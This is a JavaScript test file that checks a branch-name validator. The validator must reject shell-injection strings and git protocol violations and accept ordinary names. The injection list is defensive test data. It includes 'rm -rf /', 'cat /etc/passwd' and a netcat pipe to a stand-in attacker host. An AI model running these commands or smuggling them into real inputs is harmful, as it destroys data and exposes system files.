/**
 * Tests for branch protection and branch name safety.
 *
 * Verifies that:
 *   - validateBranchName blocks known injection vectors
 *   - validateBranchName allows valid branch names
 *   - 'main' and 'master' pass validateBranchName
 *     (protection logic for main/master lives in cli.js offerMergeToMain;
 *      validateBranchName is about *format* safety, not policy)
 *   - Protected branch names used with git commands are passed as args
 *     (not shell strings), so they can't be used for injection
 */

import { test } from "node:test";
import assert   from "node:assert/strict";
import { validateBranchName } from "../src/safety.js";

// ── Injection attempts (must be rejected) ─────────────────────────────────────

const INJECTION_VECTORS = [
  "feat; rm -rf /",
  "feat && cat /etc/passwd",
  "feat | nc attacker.com 4444",
  "feat`id`",
  "feat$(id)",
  "feat\nrm -rf /",
  "feat\trm -rf",
  "feat'bar",
  'feat"bar',
  "feat<script>",
  "feat>output",
  "feat|pipe",
  "feat&background",
];

for (const vec of INJECTION_VECTORS) {
  test(`validateBranchName rejects injection: ${JSON.stringify(vec)}`, () => {
    assert.throws(
      () => validateBranchName(vec),
      (err) => {
        assert.ok(err instanceof Error);
        return true;
      }
    );
  });
}

// ── Git protocol violations (must be rejected) ────────────────────────────────

test("validateBranchName rejects HEAD", () => {
  assert.throws(() => validateBranchName("HEAD"), /cannot be 'HEAD'/i);
});

test("validateBranchName rejects .lock suffix", () => {
  assert.throws(() => validateBranchName("feat.lock"), /cannot end with '.lock'/i);
});

test("validateBranchName rejects double-dot", () => {
  assert.throws(() => validateBranchName("a..b"), /cannot contain '\.\.'|traversal/i);
});

test("validateBranchName rejects @{ sequence", () => {
  // '@' is not in the allowlist, so this fails with "forbidden characters"
  // (the specific @{ check is secondary belt-and-suspenders)
  assert.throws(() => validateBranchName("@{reflog}"), /forbidden characters|cannot contain '@\{'/i);
});

test("validateBranchName rejects leading dash", () => {
  assert.throws(() => validateBranchName("-bad"), /cannot start with/i);
});

// ── Valid branch names (must pass) ────────────────────────────────────────────

const VALID_BRANCHES = [
  "main",
  "master",
  "develop",
  "feature/add-auth",
  "fix/123-bug",
  "release/1.0.0",
  "hotfix/critical-patch",
  "claude/security-refactor-XYqhG",
  "user/feature_name",
  "v2.0-beta",
];

for (const name of VALID_BRANCHES) {
  test(`validateBranchName accepts: ${name}`, () => {
    const result = validateBranchName(name);
    assert.equal(result, name.trim());
  });
}

// ── Whitespace trimming ───────────────────────────────────────────────────────

test("validateBranchName trims leading/trailing whitespace", () => {
  assert.equal(validateBranchName("  feature/foo  "), "feature/foo");
});

// ── Empty / null ──────────────────────────────────────────────────────────────

test("validateBranchName rejects null", () => {
  assert.throws(() => validateBranchName(null), /non-empty string/i);
});

test("validateBranchName rejects empty string", () => {
  assert.throws(() => validateBranchName(""), /blank|empty/i);
});

test("validateBranchName rejects whitespace-only", () => {
  assert.throws(() => validateBranchName("   "), /blank/i);
});
